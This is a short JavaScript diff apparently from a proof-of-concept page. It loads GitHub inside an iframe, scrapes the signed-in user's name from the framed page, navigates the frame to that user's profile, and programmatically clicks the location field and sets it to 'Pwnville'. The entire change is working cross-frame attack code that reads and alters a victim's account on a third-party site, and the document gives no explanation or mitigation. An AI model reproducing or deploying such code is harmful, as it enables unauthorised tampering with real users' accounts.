@@ -16,16 +16,24 @@ function getName() {
    return jQuery.trim($(document.getElementById('inner').contentWindow.document).find('.name').text());
 }
 
-function fillName() {
-   alert(getName()+" - "+getName().length);
-   $('#scrapedname').text(getName());
+function frameLoaded() {
+   var currName = getName();
+   $('#scrapedname').text(currName.length>0?currName:"n/a");
+   if (!currName) return;
+
+   var frame = document.getElementById('inner');
+   var userProfilePage = "http://github.com/"+currName;
+   if(frame.src != userProfilePage) {
+     frame.src = userProfilePage;
+   } else {
+     $(frame.contentWindow.document).find('#profile_location').click().find('input').val('Pwnville').blur();
+   }
 }
 
 $(function() {
-  $('#inner').load( fillName );
+  $('#inner').load( frameLoaded );
 });
 
-$('#scrapedname').html('n/a');
 </script>
 
 <a onclick="fillName">or click me</a>
